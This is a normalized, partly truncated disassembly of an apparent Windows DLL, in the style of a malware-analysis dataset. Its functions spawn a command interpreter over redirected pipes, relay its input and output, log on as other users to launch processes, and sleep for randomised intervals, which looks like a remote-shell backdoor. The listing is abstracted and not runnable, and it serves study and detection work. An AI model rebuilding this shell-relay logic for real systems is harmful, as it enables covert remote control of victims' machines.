mov eax [ rw-data ]
test eax eax
je r-xdata
sub eax esi
mov eax [ rw-data ]
je r-xdata
mov ecx [ rw-data ]
mov eax [ esi + 0xc ]
push 0x0
push 0x0
mov [ ecx + 0x4 ] eax
mov edx [ rw-data ]
push edx
push sub_10001ef0
push 0x0
push 0x0
call [ _beginthreadex@IAT ]
add esp 0x18
pop edi
pop esi
add esp 0x134
retn
mov edx [ rw-data ]
push edx
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov ecx 0x801
xor eax eax
mov edi rw-data
[ edi ]
pop edi
pop esi
add esp 0x134
retn
mov eax [ rw-data ]
mov edx [ eax + 0x4 ]
test [ edx + rw-data ] 0x6
jne r-xdata
mov ecx [ rw-data ]
push 0x10
push rw-data
mov [ rw-data ] esi
mov [ rw-data ] 0x3
mov [ rw-data ] 0xffffffff
mov [ rw-data ] 0x10
call sub_10003f32
pop edi
pop esi
add esp 0x134
retn
push 0x1
push eax
mov ecx rw-data
call [ std::basic_filebuf<char,struct std::char_traits<char> >::_Init@IAT ]
mov ecx rw-data
call [ std::basic_filebuf<char,struct std::char_traits<char> >::_Initcvt@IAT ]
mov eax rw-data
test eax eax
jne r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x4 ]
add ecx rw-data
mov eax [ ecx + 0x4 ]
mov edx [ ecx + 0x28 ]
or eax esi
test edx edx
jne r-xdata
push eax
call [ fclose@IAT ]
add esp 0x4
test eax eax
jne r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
mov eax [ eax + 0x4 ]
test [ eax + rw-data ] 0x6
jne r-xdata
mov eax edx
push esi
push esi
push 0x0
mov ecx [ eax + rw-data ]
lea eax [ esp + 0x2c ]
push eax
mov edx [ ecx ]
call [ edx + 0x20 ]
mov eax [ rw-data ]
mov ecx 0x801
xor eax eax
mov edi rw-data
[ edi ]
mov eax [ rw-data ]
mov ecx [ eax + 0x4 ]
test [ ecx + rw-data ] 0x6
je r-xdata
push 0x0
push eax
call [ std::ios_base::clear@IAT ]
pop edi
pop esi
add esp 0x134
retn
or al 0x4
push esi
push eax
mov ecx rw-data
call [ std::basic_filebuf<char,struct std::char_traits<char> >::_Init@IAT ]
mov eax rw-data
test eax eax
jne r-xdata
mov edx [ rw-data ]
mov ecx [ edx + 0x4 ]
add ecx rw-data
mov eax [ ecx + 0x4 ]
mov edx [ ecx + 0x28 ]
or eax esi
test edx edx
jne r-xdata
push eax
call [ fclose@IAT ]
add esp 0x4
test eax eax
jne r-xdata
push eax
call [ fclose@IAT ]
add esp 0x4
test eax eax
jne r-xdata
push 0xffffffff
lea ecx [ esp + 0xc ]
call sub_10003450
mov ecx [ eax + rw-data ]
push esi
push 0x1
lea eax [ esp + 0x10 ]
mov edx [ ecx ]
push 0x0
push eax
call [ edx + 0x20 ]
jmp r-xdata
push 0x0
push eax
call [ std::ios_base::clear@IAT ]
or al 0x4
push esi
push eax
mov ecx rw-data
call [ std::basic_filebuf<char,struct std::char_traits<char> >::_Init@IAT ]
mov ecx rw-data
test ecx ecx
jne r-xdata
mov eax [ rw-data ]
mov ecx [ eax + 0x4 ]
add ecx rw-data
mov eax [ ecx + 0x4 ]
mov edx [ ecx + 0x28 ]
or eax esi
test edx edx
jne r-xdata
push esi
push eax
mov ecx rw-data
call [ std::basic_filebuf<char,struct std::char_traits<char> >::_Init@IAT ]
mov edx rw-data
test edx edx
jne r-xdata
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x8 ]
add edx ecx
lea edi [ esp + 0x38 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
lea eax [ esp + 0x38 ]
push ecx
push eax
push rw-data
mov [ rw-data ] edx
mov [ rw-data ] esi
mov [ rw-data ] 0x1
call [ strncpy@IAT ]
lea edi [ esp + 0x44 ]
or ecx 0xffffffff
xor eax eax
add esp 0xc
[ edi ]
not ecx
add ecx 0x10
mov [ rw-data ] ecx
push ecx
mov ecx [ rw-data ]
push rw-data
call sub_10003f32
mov ecx [ rw-data ]
mov edi rw-data
xor eax eax
lea edx [ ecx + 0x8 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
add esp 0x134
retn
mov ecx [ rw-data ]
push 0x10
push rw-data
mov [ rw-data ] esi
mov [ rw-data ] 0x4
mov [ rw-data ] 0xffffffff
mov [ rw-data ] 0x10
call sub_10003f32
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov edi rw-data
mov edx ecx
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
mov ecx 0x801
xor eax eax
mov edi rw-data
[ edi ]
pop edi
pop esi
add esp 0x134
retn
push 0x0
push eax
call [ std::ios_base::clear@IAT ]
pop edi
pop esi
add esp 0x134
retn
or al 0x4
sub_10002990
fld [ esp + 0x8 ]
fmul [ r--data ]
push esi
call _ftol
mov esi eax
test esi esi
jne r-xdata
mov al [ esp + 0x8 ]
test al al
je r-xdata
mov esi 0xe10
lea eax [ esi + esi * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
shl eax 0x3
push 0x0
call [ time@IAT ]
push eax
call [ srand@IAT ]
add esp 0x8
call [ rand@IAT ]
xor edx edx
lea ecx [ esi + esi * 4 ]
div esi
lea ecx [ ecx + ecx * 4 ]
lea ecx [ ecx + ecx * 4 ]
shl ecx 0x3
lea eax [ edx + edx * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
shl eax 0x3
lea edx [ eax + eax * 2 ]
cmp edx ecx
jae r-xdata
pop esi
retn
test eax eax
jne r-xdata
add eax 0x7530
lea edx [ eax + eax * 2 ]
cmp edx ecx
jb r-xdata
mov eax 0xcccccccd
mul ecx
mov eax edx
shr eax 0x3
pop esi
retn
sub_10002a20
sub esp 0x20
push esi
push edi
call sub_10002e00
mov eax [ rw-data ]
mov esi [ CreateThread@IAT ]
lea ecx [ esp + 0x8 ]
xor edi edi
push ecx
push edi
push rw-data
push r-xdata
lea edx [ esp + 0x1c ]
push edi
push edx
mov [ esp + 0x24 ] 0xc
mov [ esp + 0x28 ] edi
mov [ esp + 0x2c ] edi
mov [ rw-data ] eax
call esi
cmp eax edi
mov [ rw-data ] eax
je r-xdata
pop edi
mov eax 0x1
pop esi
add esp 0x20
retn 0x4
lea eax [ esp + 0x8 ]
lea ecx [ esp + 0xc ]
push eax
push edi
push rw-data
push sub_10002d30
push edi
push ecx
call esi
cmp eax edi
mov [ rw-data ] eax
jne r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
mov [ esp + 0x18 ] ecx
push 0xffffffff
lea ecx [ esp + 0x1c ]
mov [ esp + 0x20 ] eax
mov eax [ rw-data ]
push edi
push ecx
push 0x4
mov [ esp + 0x30 ] edx
mov [ esp + 0x34 ] eax
call [ WaitForMultipleObjects@IAT ]
cmp eax 0x3
ja r-xdata
mov edx [ rw-data ]
push edi
push edx
call [ TerminateThread@IAT ]
pop edi
mov eax 0x1
pop esi
add esp 0x20
retn 0x4
mov edx [ rw-data ]
mov edi [ DisconnectNamedPipe@IAT ]
push edx
call edi
mov eax [ rw-data ]
mov esi [ CloseHandle@IAT ]
push eax
call esi
mov ecx [ rw-data ]
push ecx
call edi
mov edx [ rw-data ]
push edx
call esi
mov eax [ rw-data ]
push eax
call esi
mov ecx [ rw-data ]
push ecx
call esi
mov edx [ rw-data ]
push edx
call esi
mov ecx 0x7
xor eax eax
mov edi rw-data
[ edi ]
jmp [ eax * 4 + jump_table_10002bc4 ]
mov edx [ rw-data ]
push edi
push edx
call [ TerminateThread@IAT ]
mov eax [ rw-data ]
push 0x1
push eax
jmp r-xdata
mov ecx [ rw-data ]
push edi
push ecx
call [ TerminateThread@IAT ]
mov edx [ rw-data ]
push 0x1
push edx
jmp r-xdata
mov eax [ rw-data ]
mov esi [ TerminateThread@IAT ]
push edi
push eax
call esi
mov ecx [ rw-data ]
push edi
push ecx
call esi
jmp r-xdata
mov edx [ rw-data ]
mov esi [ TerminateThread@IAT ]
push edi
push edx
call esi
mov eax [ rw-data ]
push edi
push eax
call esi
mov ecx [ rw-data ]
push 0x1
push ecx
call [ TerminateProcess@IAT ]
sub_10002bd4
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
sub esp 0x81c
push ebx
push ebp
push esi
push edi
push 0x1c
xor bl bl
mov [ esp + 0x14 ] 0x0
call [ malloc@IAT ]
mov esi [ esp + 0x834 ]
mov ebp eax
mov ecx 0x7
mov edi ebp
add esp 0x4
xor eax eax
[ edi ] [ esi ]
mov ecx 0xff
lea edi [ esp + 0x14 ]
push eax
push eax
[ edi ]
mov edx [ ebp ]
lea eax [ esp + 0x18 ]
push eax
lea ecx [ esp + 0x20 ]
push 0x3fc
push ecx
push edx
call [ PeekNamedPipe@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x81c
retn
mov eax [ esp + 0x10 ]
test eax eax
jbe r-xdata
push 0x1f4
mov edx [ ebp ]
lea eax [ esp + 0x10 ]
push 0x0
push eax
lea ecx [ esp + 0x1c ]
push 0x3fc
push ecx
push edx
call [ ReadFile@IAT ]
mov ecx 0x106
xor eax eax
lea edi [ esp + 0x410 ]
[ edi ]
stosw [ edi ]
mov edi [ esp + 0x10 ]
xor eax eax
test edi edi
jbe r-xdata
mov ecx rw-data
call sub_10005088
mov eax [ esp + 0x10 ]
lea ecx [ esp + 0x410 ]
add eax 0xa
mov [ esp + 0x414 ] 0xa
push eax
push ecx
mov ecx [ rw-data ]
mov [ esp + 0x418 ] eax
call sub_10003f32
mov ecx rw-data
call sub_10005090
push 0xc8
jmp r-xdata
lea esi [ esp + 0x418 ]
call [ Sleep@IAT ]
mov ecx [ ebp ]
push 0x0
lea edx [ esp + 0x14 ]
push 0x0
push edx
lea eax [ esp + 0x20 ]
push 0x3fc
push eax
push ecx
call [ PeekNamedPipe@IAT ]
test eax eax
jne r-xdata
mov [ esi ] cl
inc esi
inc eax
mov bl cl
cmp eax edi
jb r-xdata
cmp bl 0xd
je r-xdata
mov cl [ esp + eax + 0x14 ]
cmp cl 0xa
jne r-xdata
mov [ esi ] 0xd
inc esi
sub_10002d30
sub esp 0x118
push ebx
push ebp
push esi
push edi
push 0x1c
mov [ esp + 0x14 ] 0x0
call [ malloc@IAT ]
mov esi [ esp + 0x130 ]
mov ebp [ WaitForSingleObject@IAT ]
mov ebx [ ResetEvent@IAT ]
mov ecx 0x7
mov edi eax
add esp 0x4
mov [ esp + 0x14 ] eax
[ edi ] [ esi ]
mov eax [ rw-data ]
push 0xffffffff
push eax
call ebp
mov ecx [ rw-data ]
push ecx
call ebx
mov ecx 0x43
xor eax eax
lea edi [ esp + 0x18 ]
mov esi rw-data
[ edi ]
stosw [ edi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
push 0x0
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0x1c ]
mov eax ecx
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
mov [ esp + 0x14 ] eax
and ecx 0x3
add eax 0x2
[ edi ] [ esi ]
mov [ esp + eax + 0x1a ] 0xd
mov [ esp + eax + 0x1b ] 0xa
lea ecx [ esp + 0x14 ]
lea edx [ esp + 0x1c ]
push ecx
push eax
mov eax [ esp + 0x20 ]
push edx
mov ecx [ eax + 0x4 ]
push ecx
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
push eax
call [ ExitThread@IAT ]
sub_10002e00
sub esp 0x14
push ebx
push esi
push edi
mov esi [ CreatePipe@IAT ]
mov ecx 0x7
xor eax eax
mov edi rw-data
xor ebx ebx
[ edi ]
lea eax [ esp + 0x14 ]
push ebx
lea ecx [ esp + 0x10 ]
push eax
push ecx
push rw-data
mov [ esp + 0x20 ] ebx
mov [ esp + 0x1c ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ esp + 0x24 ] 0xc
mov [ esp + 0x28 ] ebx
mov [ esp + 0x2c ] 0x1
call esi
test eax eax
jne r-xdata
lea edx [ esp + 0x14 ]
push ebx
push edx
lea eax [ esp + 0x18 ]
push rw-data
push eax
call esi
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov esi [ CloseHandle@IAT ]
cmp eax ebx
je r-xdata
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x10 ]
push ecx
push edx
call sub_10002f10
mov esi [ CloseHandle@IAT ]
add esp 0x8
mov [ rw-data ] eax
mov eax [ esp + 0x10 ]
push eax
call esi
mov ecx [ esp + 0xc ]
push ecx
call esi
mov eax [ rw-data ]
mov esi [ CloseHandle@IAT ]
cmp eax ebx
je r-xdata
mov eax [ esp + 0xc ]
cmp eax ebx
je r-xdata
push eax
call esi
mov eax [ esp + 0xc ]
cmp eax ebx
je r-xdata
push eax
call esi
pop edi
pop esi
pop ebx
add esp 0x14
retn
push eax
call esi
pop edi
pop esi
pop ebx
add esp 0x14
retn
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push eax
call esi
mov eax [ esp + 0x10 ]
cmp eax ebx
je r-xdata
push eax
call esi
push eax
call esi
pop edi
pop esi
pop ebx
add esp 0x14
retn
sub_10002f10
sub esp 0x158
mov eax [ esp + 0x15c ]
push ebx
mov ebx [ GetCurrentProcess@IAT ]
push esi
xor esi esi
push edi
mov edi [ esp + 0x16c ]
push esi
push 0x1
lea ecx [ esp + 0x54 ]
push 0x2
push ecx
mov [ esp + 0x1c ] 0x44
mov [ esp + 0x20 ] esi
mov [ esp + 0x28 ] esi
mov [ esp + 0x24 ] esi
mov [ esp + 0x38 ] esi
mov [ esp + 0x34 ] esi
mov [ esp + 0x30 ] esi
mov [ esp + 0x2c ] esi
mov [ esp + 0x4c ] si
mov [ esp + 0x50 ] esi
mov [ esp + 0x4e ] si
mov [ esp + 0x48 ] 0x101
mov [ esp + 0x54 ] eax
mov [ esp + 0x58 ] edi
call ebx
push eax
push edi
call ebx
push eax
call [ DuplicateHandle@IAT ]
lea edx [ esp + 0x60 ]
push 0x104
push edx
push rw-data
call [ GetEnvironmentVariableA@IAT ]
lea eax [ esp + 0x50 ]
lea ecx [ esp + 0xc ]
push eax
push ecx
push esi
push esi
push esi
push 0x1
push esi
lea edx [ esp + 0x7c ]
push esi
push edx
push esi
call [ CreateProcessA@IAT ]
test eax eax
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
add esp 0x158
retn
mov eax [ esp + 0x54 ]
mov esi [ esp + 0x50 ]
push eax
call [ CloseHandle@IAT ]
sub_10002fe0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_1000569b
push eax
mov eax 0x200c
mov [ fs : 0x0 ] esp
call sub_100034e0
push edi
lea ecx [ esp + 0x4 ]
call sub_10005098
lea ecx [ esp + 0x4 ]
mov [ esp + 0x2018 ] 0x0
call sub_10005263
mov ecx 0x801
xor eax eax
lea edi [ esp + 0xc ]
[ edi ]
lea eax [ esp + 0x14 ]
lea ecx [ esp + 0x4 ]
push eax
mov [ esp + 0x14 ] 0xc
call sub_10005108
lea edi [ esp + 0x14 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0x8
mov [ esp + 0xc ] ecx
mov ecx rw-data
call sub_10005088
mov ecx [ esp + 0xc ]
lea edx [ esp + 0xc ]
push ecx
mov ecx [ rw-data ]
push edx
call sub_10003f32
mov ecx rw-data
call sub_10005090
lea ecx [ esp + 0x4 ]
mov [ esp + 0x2018 ] 0xffffffff
call sub_100050a2
mov ecx [ esp + 0x2010 ]
pop edi
mov [ fs : 0x0 ] ecx
add esp 0x2018
retn
sub_100030b0
push 0xffffffff
push sub_100056bb
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x210
push ebx
push ebp
push esi
push edi
xor ebx ebx
mov ecx 0x40
xor eax eax
lea edi [ esp + 0x11d ]
mov [ esp + 0x11c ] bl
mov [ esp + 0x18 ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x40
xor eax eax
lea edi [ esp + 0x19 ]
[ edi ]
stosw [ edi ]
lea ecx [ esp + 0x10 ]
stosb [ edi ]
call sub_10005098
lea ecx [ esp + 0x10 ]
mov [ esp + 0x228 ] ebx
call sub_10005263
mov edi [ esp + 0x230 ]
mov [ esp + 0x1c ] 0xd
push edi
call [ atoi@IAT ]
mov esi eax
add esp 0x4
cmp esi ebx
jne r-xdata
push esi
lea ecx [ esp + 0x14 ]
call sub_10005440
push esi
lea ecx [ esp + 0x120 ]
push rw-data
mov ebp eax
push ecx
push edi
lea ecx [ esp + 0x14 ]
call sub_1000549f
mov ebp eax
push edi
lea eax [ esp + 0x120 ]
push rw-data
push eax
jmp r-xdata
call [ GetLastError@IAT ]
lea ecx [ esp + 0x11c ]
push eax
push ecx
lea edx [ esp + 0x28 ]
push rw-data
push edx
call esi
add esp 0x10
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x11c ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea edx [ esp + 0x20 ]
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x11c ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov esi [ sprintf@IAT ]
call esi
add esp 0xc
cmp ebp ebx
je r-xdata
lea edi [ esp + 0x20 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0x8
mov [ esp + 0x18 ] ecx
mov ecx rw-data
call sub_10005088
mov eax [ esp + 0x18 ]
lea ecx [ esp + 0x18 ]
push eax
push ecx
mov ecx [ rw-data ]
call sub_10003f32
mov ecx rw-data
call sub_10005090
lea ecx [ esp + 0x10 ]
mov [ esp + 0x228 ] 0xffffffff
call sub_100050a2
mov ecx [ esp + 0x220 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x21c
retn
sub_10003260
mov eax 0x205c
call sub_100034e0
push ebx
push ebp
push esi
push edi
mov ecx 0x11
xor eax eax
lea edi [ esp + 0x24 ]
xor esi esi
[ edi ]
lea eax [ esp + 0x24 ]
mov [ esp + 0x10 ] esi
push eax
call [ GetStartupInfoA@IAT ]
mov ebx [ strncmp@IAT ]
mov [ esp + 0x54 ] si
mov esi [ esp + 0x2070 ]
push 0x4
push rw-data
push esi
mov [ esp + 0x30 ] 0x44
mov [ esp + 0x5c ] 0x101
call ebx
add esp 0xc
test eax eax
jne r-xdata
lea ebp [ esi + 0x40 ]
push 0x4
push rw-data
push ebp
call ebx
add esp 0xc
test eax eax
jne r-xdata
mov ecx 0x8
mov edi esi
[ edi ]
lea ebx [ esi + 0x20 ]
push 0x4
push rw-data
push ebx
call [ strncmp@IAT ]
add esp 0xc
test eax eax
jne r-xdata
mov ecx 0x8
mov edi ebp
[ edi ]
movsx ecx [ ebx ]
movsx edx [ ebp ]
movsx eax [ esi ]
add ecx edx
add ecx eax
jne r-xdata
mov ecx 0x8
mov edi ebx
[ edi ]
lea eax [ esp + 0x10 ]
push eax
push 0x0
push 0x2
push ebx
push ebp
push esi
call [ LogonUserA@IAT ]
test eax eax
jne r-xdata
lea ecx [ esp + 0x14 ]
lea edx [ esp + 0x24 ]
push ecx
push edx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
add esi 0x60
push 0x0
push esi
push 0x0
call [ CreateProcessA@IAT ]
test eax eax
jne r-xdata
lea ecx [ esp + 0x14 ]
lea edx [ esp + 0x24 ]
push ecx
mov eax [ esp + 0x14 ]
push edx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
add esi 0x60
push 0x0
push esi
push 0x0
push eax
call [ CreateProcessAsUserA@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
push eax
mov [ esp + 0x70 ] 0xe
push rw-data
jmp r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x205c
retn
call [ GetLastError@IAT ]
push eax
lea eax [ esp + 0x74 ]
push rw-data
push eax
mov [ esp + 0x78 ] 0xe
call [ sprintf@IAT ]
lea edi [ esp + 0x7c ]
or ecx 0xffffffff
xor eax eax
add esp 0xc
[ edi ]
not ecx
add ecx 0x8
mov [ esp + 0x68 ] ecx
mov ecx rw-data
call sub_10005088
mov ecx [ esp + 0x68 ]
lea edx [ esp + 0x68 ]
push ecx
push edx
jmp r-xdata
call [ GetLastError@IAT ]
push eax
mov [ esp + 0x70 ] 0xe
push rw-data
lea ecx [ esp + 0x78 ]
push ecx
call [ sprintf@IAT ]
lea edi [ esp + 0x7c ]
or ecx 0xffffffff
xor eax eax
add esp 0xc
[ edi ]
not ecx
add ecx 0x8
mov [ esp + 0x68 ] ecx
mov ecx rw-data
call sub_10005088
mov edx [ esp + 0x68 ]
lea eax [ esp + 0x68 ]
push edx
push eax
mov ecx [ rw-data ]
call sub_10003f32
mov ecx rw-data
call sub_10005090
sub_10003450
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
mov [ esi ] eax
mov ecx [ std::_Fpz@IAT ]
mov edx [ ecx ]
mov [ esi + 0x8 ] edx
mov eax [ ecx + 0x4 ]
lea ecx [ esp + 0x8 ]
mov [ esi + 0xc ] eax
call [ std::_Lockit::_Lockit@IAT ]
mov ecx [ rw-data ]
mov [ esi + 0x10 ] ecx
lea ecx [ esp + 0x8 ]
call [ std::_Lockit::~_Lockit@IAT ]
mov eax esi
pop esi
retn 0x4
sub_100034e0
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
sub_10003516
mov eax [ esp + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ _adjust_fdiv@IAT ]
cmp eax 0x1
mov ecx [ ecx ]
mov [ rw-data ] ecx
jne r-xdata
cmp [ rw-data ] eax
jle r-xdata
test eax eax
jne r-xdata
push 0x80
call [ malloc@IAT ]
test eax eax
pop ecx
mov [ rw-data ] eax
jne r-xdata
xor eax eax
jmp r-xdata
dec [ rw-data ]
push 0x1
pop eax
mov eax [ rw-data ]
test eax eax
je r-xdata
and [ eax ] 0x0
mov eax [ rw-data ]
push rw-data
push rw-data
mov [ rw-data ] eax
call _initterm
inc [ rw-data ]
pop ecx
pop ecx
jmp r-xdata
retn 0xc
mov ecx [ rw-data ]
push esi
lea esi [ ecx - 0x4 ]
push eax
call [ free@IAT ]
and [ rw-data ] 0x0
pop ecx
pop esi
mov ecx [ esi ]
test ecx ecx
je r-xdata
sub esi 0x4
jmp r-xdata
call ecx
mov eax [ rw-data ]
cmp esi eax
jb r-xdata
_start
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
test esi esi
jne r-xdata
cmp esi 0x1
je r-xdata
cmp [ rw-data ] 0x0
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp esi 0x2
jne r-xdata
jne r-xdata
push edi
push esi
push ebx
call sub_10003516
test eax eax
push edi
push esi
push ebx
call eax
test eax eax
je r-xdata
push edi
push esi
push ebx
call sub_10001100
cmp esi 0x1
mov [ ebp + 0xc ] eax
jne r-xdata
xor eax eax
jmp r-xdata
test esi esi
je r-xdata
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push edi
push esi
push ebx
call sub_10003516
test eax eax
jne r-xdata
cmp esi 0x3
jne r-xdata
mov eax [ ebp + 0xc ]
push edi
push eax
push ebx
call sub_10003516
cmp [ ebp + 0xc ] 0x0
je r-xdata
and [ ebp + 0xc ] eax
mov eax [ rw-data ]
test eax eax
je r-xdata
push edi
push esi
push ebx
call eax
mov [ ebp + 0xc ] eax
sub_1000367e
mov eax sub_100056c8
call sub_1000556c
sub esp 0xc
push ebx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
cmp [ esi + 0x18 ] 0x0
je r-xdata
push 0x104
call ??2@YAPAXI@Z
pop ecx
mov [ esi + 0x18 ] eax
push [ ebp + 0x8 ]
call [ lstrlenA@IAT ]
inc eax
push eax
push [ ebp + 0x8 ]
push [ esi + 0x18 ]
call [ lstrcpynA@IAT ]
push [ ebp + 0xc ]
and [ ebp - 0x4 ] 0x0
mov ecx esi
call sub_1000463f
mov ecx esi
call sub_10003708
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x8
push 0x1
call sub_1000470e
mov ecx esi
call sub_100044fa
sub_10003708
mov eax sub_100056f0
call sub_1000556c
sub esp 0x3c
push ebx
push esi
mov esi ecx
xor ebx ebx
lea ecx [ ebp - 0x38 ]
push edi
mov eax [ esi + 0x2c ]
mov [ ebp - 0x2c ] 0x1
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x44 ] 0x1
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x48 ] ebx
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x4 ] ebx
push ecx
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x48 ]
push ecx
mov [ ebp - 0x34 ] 0x2
push [ esi + 0x28 ]
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x30 ] ebx
push ebx
push ebx
push 0x10
push ebx
push 0x8c11c
push [ esi + 0x18 ]
push ebx
push [ esi + 0x24 ]
call [ eax + 0x18 ]
mov edi eax
cmp edi 0x90320
jne r-xdata
cmp edi 0x90312
je r-xdata
push esi
call [ esi + 0x8 ]
pop ecx
cmp [ ebp - 0x38 ] ebx
mov [ esi + 0x14 ] 0x1
je r-xdata
push 0x18
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x14 ] eax
cmp eax ebx
mov [ ebp - 0x4 ] 0x1
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x48 ]
call sub_100047c6
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
cmp [ ebp - 0x30 ] ebx
je r-xdata
xor eax eax
push edi
lea eax [ ebp - 0xd ]
sub esp 0x10
mov ecx esp
mov [ ebp - 0x20 ] esp
push eax
push rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ ebp - 0x14 ]
call sub_1000385c
jmp r-xdata
push [ ebp - 0x38 ]
mov ecx esi
push [ ebp - 0x30 ]
call sub_100044a1
cmp al bl
jne r-xdata
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
push r--data
push eax
mov [ ebp - 0x4 ] bl
call _CxxThrowException
push 0x18
call operator new
pop ecx
mov [ ebp - 0x18 ] eax
cmp eax ebx
mov [ ebp - 0x4 ] 0x2
je r-xdata
xor eax eax
push ebx
lea eax [ ebp - 0xd ]
sub esp 0x10
mov ecx esp
mov [ ebp - 0x20 ] esp
push eax
push rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ ebp - 0x18 ]
call sub_10003927
jmp r-xdata
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x14 ]
push r--data
push eax
mov [ ebp - 0x4 ] bl
call _CxxThrowException
sub_1000385c
mov eax sub_10005705
call sub_1000556c
push esi
mov esi ecx
push [ ebp + 0x18 ]
and [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0x8 ]
sub esp 0x10
mov ecx esp
mov [ ebp + 0x18 ] esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx esi
call sub_100038af
or [ ebp - 0x4 ] 0xffffffff
push 0x1
lea ecx [ ebp + 0x8 ]
mov [ esi ] r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
mov ecx [ ebp - 0xc ]
mov eax esi
mov [ fs : 0x0 ] ecx
pop esi
leave
retn 0x14
sub_100038af
mov eax sub_10005719
call sub_1000556c
push esi
push edi
mov esi ecx
mov eax [ ebp + 0x18 ]
and [ ebp - 0x4 ] 0x0
mov [ esi + 0x4 ] eax
mov al [ ebp + 0x8 ]
lea edi [ esi + 0x8 ]
push 0x0
mov ecx edi
mov [ edi ] al
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
mov eax [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
mov ecx edi
push [ eax ]
lea eax [ ebp + 0x8 ]
push 0x0
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::assign@IAT ]
or [ ebp - 0x4 ] 0xffffffff
push 0x1
lea ecx [ ebp + 0x8 ]
mov [ esi ] r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
mov ecx [ ebp - 0xc ]
mov eax esi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x14
sub_10003927
